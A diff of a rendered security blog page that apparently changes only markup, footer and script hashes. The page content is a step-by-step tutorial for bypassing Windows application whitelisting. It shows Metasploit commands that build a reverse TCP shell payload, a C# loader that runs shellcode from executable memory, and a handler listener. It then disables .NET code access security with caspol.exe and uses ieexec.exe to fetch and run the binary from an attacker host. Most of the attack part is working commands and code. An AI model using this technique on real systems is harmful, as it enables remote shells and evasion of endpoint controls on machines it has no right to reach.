@@ -146,7 +146,7 @@ by Christopher Campbell &amp; Matthew Graeber</p>
 <p>So lets get started!</p>
 <p><strong>Step 1.</strong> Prepare your Shellcode, or whatever malicious app you want. I compiled my executable using SharpDevelop, since it has less footprint than a full blown Visual Studio install.
 From msfconsole:</p>
-<pre><code>msf &gt; use windows/x64/shell/reverse_tcp
+<pre tabindex="0"><code>msf &gt; use windows/x64/shell/reverse_tcp
 msf payload(reverse_tcp) &gt; set LHOST x.x.x.x
 msf payload(reverse_tcp) &gt; set LPORT 443
 msf payload(reverse_tcp) &gt; generate -t csharp
@@ -155,108 +155,108 @@ byte[] buf = new byte[422] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0
 
  &lt;Snipped Full ShellCode for Brevity&gt;
 </code></pre><p><strong>Step 2.</strong> Create the .NET wrapper application</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp"><span style="color:#66d9ef">using</span> System; 
-<span style="color:#66d9ef">using</span> System.Runtime.InteropServices; 
-<span style="color:#66d9ef">namespace</span> native 
-{ 
-    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span> 
-    { 
-            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 MEM_COMMIT = <span style="color:#ae81ff">0</span>x1000; 
-            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span style="color:#ae81ff">0</span>x40; 
-            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 MEM_RELEASE = <span style="color:#ae81ff">0</span>x8000; 
-
-        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args) 
-        { 
-            <span style="color:#75715e">// native function&#39;s compiled code 
-</span><span style="color:#75715e"></span>
-            <span style="color:#66d9ef">byte</span>[] proc = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] { 
-                <span style="color:#ae81ff">0</span>xfc,<span style="color:#ae81ff">0</span>x48,<span style="color:#ae81ff">0</span>x83,<span style="color:#ae81ff">0</span>xe4,<span style="color:#ae81ff">0</span>xf0,<span style="color:#ae81ff">0</span>xe8,<span style="color:#ae81ff">0</span>xc0,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x00,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x51,<span style="color:#ae81ff">0</span>x41,<span style="color:#ae81ff">0</span>x50,<span style="color:#ae81ff">0</span>x52... 
-            
-            <span style="color:#75715e">//Edited ShellCode For Brevity 
-</span><span style="color:#75715e"></span>            }; 
-
-            UInt32 funcAddr = VirtualAlloc(<span style="color:#ae81ff">0</span>, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
-            Marshal.Copy(proc, <span style="color:#ae81ff">0</span>, (IntPtr)(funcAddr), proc.Length); 
-            IntPtr hThread = IntPtr.Zero; 
-            UInt32 threadId = <span style="color:#ae81ff">0</span>; 
-
-            <span style="color:#75715e">// prepare data 
-</span><span style="color:#75715e"></span>
-            PROCESSOR_INFO info = <span style="color:#66d9ef">new</span> PROCESSOR_INFO(); 
-            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(<span style="color:#66d9ef">typeof</span>(PROCESSOR_INFO))); 
-            Marshal.StructureToPtr(info, pinfo, <span style="color:#66d9ef">false</span>); 
-            
-            <span style="color:#75715e">// execute native code 
-</span><span style="color:#75715e"></span>
-            hThread = CreateThread(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, funcAddr, pinfo, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">ref</span> threadId); 
-            WaitForSingleObject(hThread, <span style="color:#ae81ff">0</span>xFFFFFFFF); 
-
-            <span style="color:#75715e">// retrive data 
-</span><span style="color:#75715e"></span>
-            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, <span style="color:#66d9ef">typeof</span>(PROCESSOR_INFO)); 
-            Marshal.FreeHGlobal(pinfo); 
-            CloseHandle(hThread);
-            VirtualFree((IntPtr)funcAddr, <span style="color:#ae81ff">0</span>, MEM_RELEASE); 
-        } 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span style="color:#66d9ef">ref</span> UInt32 lpThreadId ); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> CloseHandle(IntPtr handle); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr GetModuleHandle( <span style="color:#66d9ef">string</span> moduleName ); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 GetProcAddress( IntPtr hModule, <span style="color:#66d9ef">string</span> procName ); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 LoadLibrary( <span style="color:#66d9ef">string</span> lpFileName ); 
-<span style="color:#a6e22e">
-</span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
-        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 GetLastError();
-<span style="color:#a6e22e">        
-</span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential)]</span> 
-        <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PROCESSOR_INFO</span> 
-        { 
-            <span style="color:#66d9ef">public</span> UInt32 dwMax; 
-            <span style="color:#66d9ef">public</span> UInt32 id0; 
-            <span style="color:#66d9ef">public</span> UInt32 id1; 
-            <span style="color:#66d9ef">public</span> UInt32 id2; 
-            <span style="color:#66d9ef">public</span> UInt32 dwStandard; 
-            <span style="color:#66d9ef">public</span> UInt32 dwFeature; 
-
-            <span style="color:#75715e">// if AMD 
-</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">public</span> UInt32 dwExt; 
-        }
-    } 
-}
-</code></pre></div><p>You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System; 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Runtime.InteropServices; 
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">namespace</span> native 
+</span></span><span style="display:flex;"><span>{ 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Program</span> 
+</span></span><span style="display:flex;"><span>    { 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 MEM_COMMIT = <span style="color:#ae81ff">0x1000</span>; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span style="color:#ae81ff">0x40</span>; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> UInt32 MEM_RELEASE = <span style="color:#ae81ff">0x8000</span>; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> Main(<span style="color:#66d9ef">string</span>[] args) 
+</span></span><span style="display:flex;"><span>        { 
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// native function&#39;s compiled code </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">byte</span>[] proc = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span>[] { 
+</span></span><span style="display:flex;"><span>                <span style="color:#ae81ff">0xfc</span>,<span style="color:#ae81ff">0x48</span>,<span style="color:#ae81ff">0x83</span>,<span style="color:#ae81ff">0xe4</span>,<span style="color:#ae81ff">0xf0</span>,<span style="color:#ae81ff">0xe8</span>,<span style="color:#ae81ff">0xc0</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x00</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x51</span>,<span style="color:#ae81ff">0x41</span>,<span style="color:#ae81ff">0x50</span>,<span style="color:#ae81ff">0x52</span>... 
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">//Edited ShellCode For Brevity </span>
+</span></span><span style="display:flex;"><span>            }; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            UInt32 funcAddr = VirtualAlloc(<span style="color:#ae81ff">0</span>, (UInt32)proc.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+</span></span><span style="display:flex;"><span>            Marshal.Copy(proc, <span style="color:#ae81ff">0</span>, (IntPtr)(funcAddr), proc.Length); 
+</span></span><span style="display:flex;"><span>            IntPtr hThread = IntPtr.Zero; 
+</span></span><span style="display:flex;"><span>            UInt32 threadId = <span style="color:#ae81ff">0</span>; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// prepare data </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            PROCESSOR_INFO info = <span style="color:#66d9ef">new</span> PROCESSOR_INFO(); 
+</span></span><span style="display:flex;"><span>            IntPtr pinfo = Marshal.AllocHGlobal(Marshal.SizeOf(<span style="color:#66d9ef">typeof</span>(PROCESSOR_INFO))); 
+</span></span><span style="display:flex;"><span>            Marshal.StructureToPtr(info, pinfo, <span style="color:#66d9ef">false</span>); 
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// execute native code </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            hThread = CreateThread(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, funcAddr, pinfo, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">ref</span> threadId); 
+</span></span><span style="display:flex;"><span>            WaitForSingleObject(hThread, <span style="color:#ae81ff">0xFFFFFFFF</span>); 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// retrive data </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            info = (PROCESSOR_INFO)Marshal.PtrToStructure(pinfo, <span style="color:#66d9ef">typeof</span>(PROCESSOR_INFO)); 
+</span></span><span style="display:flex;"><span>            Marshal.FreeHGlobal(pinfo); 
+</span></span><span style="display:flex;"><span>            CloseHandle(hThread);
+</span></span><span style="display:flex;"><span>            VirtualFree((IntPtr)funcAddr, <span style="color:#ae81ff">0</span>, MEM_RELEASE); 
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, <span style="color:#66d9ef">ref</span> UInt32 lpThreadId ); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">bool</span> CloseHandle(IntPtr handle); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> IntPtr GetModuleHandle( <span style="color:#66d9ef">string</span> moduleName ); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 GetProcAddress( IntPtr hModule, <span style="color:#66d9ef">string</span> procName ); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 LoadLibrary( <span style="color:#66d9ef">string</span> lpFileName ); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [DllImport(&#34;kernel32&#34;)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> UInt32 GetLastError();
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">        
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential)]</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">internal</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PROCESSOR_INFO</span> 
+</span></span><span style="display:flex;"><span>        { 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> UInt32 dwMax; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> UInt32 id0; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> UInt32 id1; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> UInt32 id2; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> UInt32 dwStandard; 
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> UInt32 dwFeature; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// if AMD </span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> UInt32 dwExt; 
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>You will want to compile the exe for the target platform. In this case I am going for an x64 target. Also, you will want to compile for 2.0 or 3.5 Framework.</p>
 <p><strong>Step 3.</strong> Host the Exe. For this example, I used Mongoose. Simple and Effective:</p>
 <p><a href="http://code.google.com/p/mongoose/">http://code.google.com/p/mongoose/</a></p>
 <p>By default Mongoose listens on port 8080. This is configurable. Simple place your compiled binary from step 2 into the same directory as Mongoose. Start Mongoose and you are almost ready to deliver your payload.</p>
 <p><strong>Step 4.</strong> Setup your receiver:</p>
-<pre><code>msf payload(reverse_tcp) &gt; use exploit/multi/handler
+<pre tabindex="0"><code>msf payload(reverse_tcp) &gt; use exploit/multi/handler
 msf exploit(handler) &gt; set LHOST x.x.x.x
 msf exploit(handler) &gt; set LPORT 443
 msf exploit(handler) &gt; set PAYLOAD windows/x64/shell/reverse_tcp
 msf exploit(handler) &gt; exploit -j
 </code></pre><p><strong>Step 5.</strong> From the host that is protected via Whitelisting. Open 2 Command Prompts as administrator.</p>
 <p><strong>CMD 1 Execute:</strong></p>
-<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
+<pre tabindex="0"><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;caspol.exe -s off
 </code></pre><p>￼
 <strong>CMD 2 Execute:</strong></p>
-<pre><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
+<pre tabindex="0"><code>C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;ieexec.exe http://x.x.x.x:8080/bypass.exe
 </code></pre><p>There is some detail to unpack here, I can go over later, as to why we need to run caspol.exe. Here’s the behavior I saw in our experimentation with this.</p>
 <p>Initial attempt to run our rogue binary fails, since it is unknown/untrusted/unapproved:</p>
 <p><img src="/images/2014/201401_whitelisting_1.png" alt=""></p>
@@ -295,7 +295,7 @@ msf exploit(handler) &gt; exploit -j
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2021</span>
+            <span>&copy; 2023</span>
             
             <span><a href="https://malicious.link/post/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
         </div>
@@ -303,7 +303,7 @@ msf exploit(handler) &gt; exploit -j
     <div class="footer__inner">
         <div class="footer__content">
             <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
-            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/mubix">mubix</a> - Theme by <a href="https://github.com/rhazdon/">Djordje Atlialp</a></span>
           </div>
     </div>
 </footer>
@@ -316,7 +316,7 @@ msf exploit(handler) &gt; exploit -j
 
 
 
-<script type="text/javascript" src="/bundle.min.a0f363fdf81cdc5cfacc447a79c33189eb000d090336cd04aac8ee256f423b3133b836c281944c19c75e38d0b0b449f01ce5807e37798b7ac94ac1db51983fc4.js" integrity="sha512-oPNj/fgc3Fz6zER6ecMxiesADQkDNs0EqsjuJW9COzEzuDbCgZRMGcdeONCwtEnwHOWAfjd5i3rJSsHbUZg/xA=="></script>
+<script type="text/javascript" src="/bundle.min.8cc3758efe48ef82e2eb9a5f317b44c0805353a43762207be6fe8ffb05815cce7a19d37f6bf387c378a3bdfc3029981668d645374a33db4ee3480e15a4bfdc7c.js" integrity="sha512-jMN1jv5I74Li65pfMXtEwIBTU6Q3YiB75v6P&#43;wWBXM56GdN/a/OHw3ijvfwwKZgWaNZFN0oz207jSA4VpL/cfA=="></script>
 
 
 
